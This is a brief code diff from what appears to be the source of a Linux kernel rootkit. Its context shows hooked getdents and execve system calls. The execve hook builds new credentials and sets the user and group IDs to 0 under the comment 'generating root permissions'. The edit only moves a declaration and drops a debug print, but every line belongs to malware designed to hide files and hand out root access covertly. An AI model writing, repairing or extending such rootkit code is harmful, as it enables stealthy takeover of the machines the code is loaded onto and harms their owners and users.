@@ -204,12 +204,10 @@ static asmlinkage long new_sys_getdents(const struct pt_regs *pt_regs)
 
 static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
 {
-  struct cred *np;
   t_syscall orig_syscall = SYSCALL(execve);
-
-  debug_print("HOOK: executing new_sys_execve()");
   
   /* generating root permissions */
+  struct cred *np;
   np = prepare_creds();
 
   np->uid.val = np->gid.val = 0;
